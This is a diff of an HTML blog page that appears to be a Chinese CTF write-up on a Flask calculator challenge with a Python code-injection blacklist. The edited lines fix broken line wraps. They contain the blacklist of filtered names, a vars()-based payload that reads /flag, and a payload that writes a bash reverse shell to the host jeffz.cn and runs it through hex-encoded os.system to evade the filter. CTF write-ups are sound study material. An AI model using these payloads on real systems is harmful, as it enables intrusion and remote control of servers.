@@ -182,8 +182,7 @@ app<span class="token punctuation">.</span>config<span class="token punctuation"
         input_question <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'question'</span><span class="token punctuation">)</span>
         session<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span> <span class="token operator">=</span> create_question
         <span class="token keyword">if</span> input_question<span class="token operator">==</span>None<span class="token punctuation">:</span>
-            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span>"Invalid session please <span class="token keyword">try</span> 
-                                   again!"<span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"Invalid session please try again!"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
         <span class="token keyword">if</span> filter<span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"hack"</span><span class="token punctuation">:</span>
             <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"hack"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
         <span class="token keyword">try</span><span class="token punctuation">:</span>
@@ -287,8 +286,7 @@ app<span class="token punctuation">.</span>config<span class="token punctuation"
         input_question <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'question'</span><span class="token punctuation">)</span>
         session<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span> <span class="token operator">=</span> create_question
         <span class="token keyword">if</span> input_question <span class="token operator">==</span> None<span class="token punctuation">:</span>
-            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span>"Invalid session please <span class="token keyword">try</span>
-                                   again!"<span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"Invalid session please tryagain!"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
         <span class="token keyword">if</span> filter<span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"hack"</span><span class="token punctuation">:</span>
             <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> answer<span class="token operator">=</span><span class="token string">"hack"</span><span class="token punctuation">,</span> question<span class="token operator">=</span>create_question<span class="token punctuation">)</span>
         calc_str <span class="token operator">=</span> input_question <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>input<span class="token punctuation">)</span>
@@ -321,12 +319,8 @@ app<span class="token punctuation">.</span>config<span class="token punctuation"
 1,vars(open(&#39;/flag&#39;,&#39;r&#39;).__class__)[&#39;re&#39;+&#39;ad&#39;](open(&#39;/flag&#39;,&#39;r&#39;))</code></pre><p>得到flag</p>
 <p>其他方法：</p>
 <p>黑名单</p>
-<pre><code>black_list = [&#39;os&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;system&#39;,&#39;if&#39;,&#39;for&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;builtins&#39;
-,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;enter&#39;,&#39;%&#39;,&#39;or&#39;,&#39;ls&#39;,&#39;sys
-&#39;,&#39;globals&#39;,&#39;read&#39;,&#39;popen&#39;]</code></pre><p>没有过滤exec，但是因为<code>exec</code>不会返回命令执行的结果，所以我们利用上<code>open().write()</code>来反弹shell，这里用hex绕过对os.system的过滤。</p>
-<pre><code>1,open(&#39;/tmp/c.sh&#39;,&#39;w&#39;).write(&#39;/bin/bash -i &gt; 
-/dev/tcp/jeffz.cn/60090&gt;&amp;1&#39;),exec(bytes.fromhex(&#39;6f732e73797374656d28272f62696e2f62617
-368202f746d702f632e73682729&#39;).decode())</code></pre>
+<pre><code>black_list = [&#39;os&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;system&#39;,&#39;if&#39;,&#39;for&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;enter&#39;,&#39;%&#39;,&#39;or&#39;,&#39;ls&#39;,&#39;sys&#39;,&#39;globals&#39;,&#39;read&#39;,&#39;popen&#39;]</code></pre><p>没有过滤exec，但是因为<code>exec</code>不会返回命令执行的结果，所以我们利用上<code>open().write()</code>来反弹shell，这里用hex绕过对os.system的过滤。</p>
+<pre><code>1,open(&#39;/tmp/c.sh&#39;,&#39;w&#39;).write(&#39;/bin/bash -i &gt; /dev/tcp/jeffz.cn/60090&gt;&amp;1&#39;),exec(bytes.fromhex(&#39;6f732e73797374656d28272f62696e2f62617368202f746d702f632e73682729&#39;).decode())</code></pre>
             </div>
 
             <!-- Post Comments -->
